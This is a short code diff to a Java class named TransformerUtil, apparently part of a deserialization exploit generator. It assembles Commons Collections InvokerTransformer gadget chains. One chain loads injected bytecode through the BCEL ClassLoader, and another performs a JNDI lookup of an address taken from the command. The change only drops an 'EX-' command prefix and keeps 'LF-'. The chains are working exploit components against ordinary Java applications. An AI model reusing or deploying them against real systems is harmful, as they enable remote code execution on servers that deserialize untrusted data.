@@ -45,8 +45,8 @@ public class TransformerUtil {
             command = command.substring(3);
             String bcelBytes;
 
-            // 对 BCEL 也支持 EX 或 LF 扩展功能
-            if (command.startsWith("EX-") || command.startsWith("LF-")) {
+            // 对 BCEL 也支持 LF 扩展功能
+            if (command.startsWith("LF-")) {
                 CtClass ctClass = generateClass(command);
                 bcelBytes = Utils.generateBCELFormClassBytes(Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode());
             } else {
@@ -56,7 +56,7 @@ public class TransformerUtil {
             transformers = new Transformer[]{new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelBytes}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
         } else if (command.startsWith("JD-")) {
             transformers = new Transformer[]{new ConstantTransformer(javax.naming.InitialContext.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{command.split("-")[1]}), new ConstantTransformer(1)};
-        } else if (command.startsWith("EX-") || command.startsWith("LF-")) {
+        } else if (command.startsWith("LF-")) {
             CtClass ctClass = generateClass(command);
 
             if (USING_MOZILLA_DEFININGCLASSLOADER) {
